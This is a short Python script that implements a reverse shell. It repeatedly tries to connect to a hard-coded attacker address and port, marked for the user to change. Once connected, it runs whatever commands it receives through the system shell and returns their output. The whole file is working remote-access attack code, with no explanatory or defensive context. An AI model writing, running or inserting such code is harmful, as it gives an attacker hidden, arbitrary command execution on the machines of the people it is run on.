import socket
import subprocess
import time

def command_exec(command):
    return subprocess.check_output(command, shell=True)

def connect():
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((LHOST, LPORT))
            connection.send(("\nSuccessfully connected\n").encode())
            return connection
        except socket.error:
            time.sleep(5)


LHOST = '192.168.1.186' # CHANGE THIS
LPORT = 4545            # CHANGE THIS

connection = connect()

while True:
    command_query = connection.recv(1024).decode()

    if not command_query:
        continue

    command_output = command_exec(command_query)
    connection.send(command_output)